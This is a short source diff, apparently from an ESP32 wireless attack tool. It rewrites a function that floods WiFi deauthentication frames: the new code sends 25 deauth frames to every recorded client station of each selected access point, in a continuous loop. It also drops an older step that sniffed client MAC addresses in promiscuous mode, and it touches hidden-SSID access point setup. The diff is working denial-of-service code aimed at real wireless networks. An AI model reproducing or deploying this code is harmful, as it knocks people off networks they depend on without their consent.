@@ -248,28 +248,20 @@ void WiFiModule::broadcastDeauthAP(){
   while(wifi_initialized){
     for(int i = 0; i < access_points->size(); i++){
      AccessPoint ap = access_points->get(i);
-     if(ap.selected){
-      target_ap = ap;
-      break;
-     }
-    }
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_filter(&filt);
-    esp_wifi_set_promiscuous_rx_cb(&collectMacAddressCallback);
-    esp_wifi_set_channel(target_ap.channel, WIFI_SECOND_CHAN_NONE);
-    delay(10000);
-    esp_wifi_set_promiscuous(false);
-    for(int i = 0; i < target_macs.size(); i++){
-      uint8_t *mac = target_macs.get(i);
-      sendDeauthFrame(target_ap.bssid, target_ap.channel, mac);
+     if (ap.selected) {
+      for (int i = 0; i < ap.stations->size(); i++) {
+        Station cur_sta = stations->get(ap.stations->get(i));
+          for (int y = 0; y < 25; y++) {
+            sendDeauthFrame(ap.bssid, ap.channel, cur_sta.mac);
+          }
+        }
+      }
     }
   }
-
 }
 
 void WiFiModule::RunSetup()
 {
-
   ap_config.ap.ssid_hidden = 1;
   ap_config.ap.beacon_interval = 10000;
   ap_config.ap.ssid_len = 0;
